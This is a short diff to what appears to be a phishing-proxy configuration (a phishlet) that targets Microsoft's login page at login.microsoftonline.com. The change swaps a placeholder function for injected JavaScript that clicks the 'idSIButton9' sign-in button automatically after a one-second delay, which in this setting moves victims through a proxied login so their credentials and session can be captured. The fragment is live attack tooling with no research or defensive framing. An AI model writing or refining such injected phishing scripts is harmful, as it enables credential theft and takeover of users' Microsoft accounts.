@@ -110,9 +110,10 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/login"]
     script: |
-      function lp() { 
-        console.log("yeah")
+      function lp2() { 
+        document.getElementById("idSIButton9").click();
       }
+      setTimeout(function(){ lp2(); }, 1000);
 
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
